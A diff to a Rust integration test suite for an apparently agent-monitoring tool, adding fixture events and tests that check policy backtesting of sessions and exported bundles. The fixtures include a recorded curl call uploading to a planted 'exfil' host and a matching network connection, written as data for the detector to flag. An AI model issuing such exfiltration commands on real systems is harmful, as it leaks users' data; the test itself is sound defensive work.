@@ -10,7 +10,9 @@ use std::process::Command;
 
 use wyrd_cell::session::CreateOptions;
 use wyrd_cell::{DataDir, Session};
-use wyrd_schema::{DnsQuery, Event, EventBody, FilePath, FileWrite, SessionState};
+use wyrd_schema::{
+    DnsQuery, Event, EventBody, FilePath, FileWrite, NetConnect, NetVerdict, ProcExec, SessionState,
+};
 
 struct Env {
     tmp: tempfile::TempDir,
@@ -73,6 +75,19 @@ fn env() -> Env {
             })),
             ev(EventBody::DnsQuery(DnsQuery {
                 name: "exfil.planted.example".into(),
+            })),
+            ev(EventBody::ProcExec(ProcExec {
+                filename: "/usr/bin/curl".into(),
+                argv: vec!["curl".into(), "https://exfil.planted.example/up".into()],
+                cwd: None,
+                truncated: false,
+            })),
+            ev(EventBody::NetConnect(NetConnect {
+                family: 4,
+                addr: "203.0.113.9".into(),
+                port: 443,
+                dns_name: Some("exfil.planted.example".into()),
+                verdict: NetVerdict::Allowed,
             })),
         ])
         .unwrap();
@@ -421,4 +436,66 @@ fn import_adds_a_read_only_session_with_the_same_chain() {
     assert!(s.request_rewind("c1", "agent asks", "mcp").is_err());
     assert!(s.reject_rewind(1, "cli", None).is_err());
     assert!(s.confirm_rewind(1, "cli").is_err());
+}
+
+fn policy_fixture() -> String {
+    Path::new(env!("CARGO_MANIFEST_DIR"))
+        .join("../../policies/fixtures/escape.wasm")
+        .display()
+        .to_string()
+}
+
+#[test]
+fn backtest_of_a_bundle_matches_the_session() {
+    let e = env();
+    let policy = policy_fixture();
+    let (code, of_session, stderr) = wyrd(&e, &["policy", "backtest", &policy, &e.id, "--json"]);
+    assert_eq!(code, 0, "{stderr}");
+    let path = export(&e, "bt.wyrd", &["--redact", "standard"]);
+    let p = path.display().to_string();
+    let (code, of_bundle, stderr) = wyrd(&e, &["policy", "backtest", &policy, &p, "--json"]);
+    assert_eq!(code, 0, "{stderr}");
+    assert_eq!(of_bundle, of_session);
+    let report: serde_json::Value = serde_json::from_str(&of_bundle).unwrap();
+    assert_eq!(report["session_id"], e.id.as_str());
+    let findings = report["findings"].as_array().unwrap();
+    assert!(findings.len() >= 2, "{report}");
+    assert!(of_bundle.contains("curl"), "{of_bundle}");
+    assert!(of_bundle.contains("203.0.113.9"), "{of_bundle}");
+
+    // The human-readable output lists the same findings.
+    let (code, text, _) = wyrd(&e, &["policy", "backtest", &policy, &p]);
+    assert_eq!(code, 0);
+    for f in findings {
+        assert!(text.contains(&format!("seq {:<6}", f["seq"])), "{text}");
+    }
+
+    // An imported bundle backtests like its source too.
+    let (_, out, _) = wyrd(&e, &["import", &p, "--json"]);
+    let id = serde_json::from_str::<serde_json::Value>(&out).unwrap()["session"]
+        .as_str()
+        .unwrap()
+        .to_string();
+    let (_, of_import, _) = wyrd(&e, &["policy", "backtest", &policy, &id, "--json"]);
+    assert_eq!(of_import, of_session);
+}
+
+#[test]
+fn an_unverifiable_bundle_is_not_backtested() {
+    let e = env();
+    let path = export(&e, "bad-bt.wyrd", &[]);
+    tamper_dns_event(&path);
+    let (code, stdout, stderr) = wyrd(
+        &e,
+        &[
+            "policy",
+            "backtest",
+            &policy_fixture(),
+            &path.display().to_string(),
+        ],
+    );
+    assert_eq!(code, 3, "{stdout}{stderr}");
+    assert!(stdout.is_empty(), "{stdout}");
+    assert!(stderr.contains("does not verify"), "{stderr}");
+    assert!(stderr.contains("event modified at seq"), "{stderr}");
 }
